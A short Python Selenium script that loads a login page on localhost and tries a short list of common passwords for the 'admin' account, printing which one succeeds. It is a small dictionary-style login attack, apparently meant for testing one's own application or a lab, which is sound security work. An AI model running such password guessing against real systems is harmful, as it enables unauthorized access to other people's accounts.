from selenium import webdriver
from selenium.webdriver.common.by import By


def login(username, password):
    username_input = driver.find_element(By.NAME, "username")
    password_input = driver.find_element(By.NAME, "password")
    login_button = driver.find_element(By.NAME, "login")

    username_input.send_keys(username)
    password_input.send_keys(password)
    login_button.click()


if __name__ == "__main__":
    driver = webdriver.Firefox()
    driver.get("http://127.0.0.1:8080")
    assert "Login Page" in driver.title

    username = "admin"
    password_list = ["password", "123456", "admin", "letmein", "qwerty"]

    for password in password_list:
        login(username, password)
        if "Login Page" not in driver.title:
            print(
                f"Login successful with username: {username} and password: {password}"
            )
            break
        else:
            print(f"Login failed with password: {password}")

    driver.close()
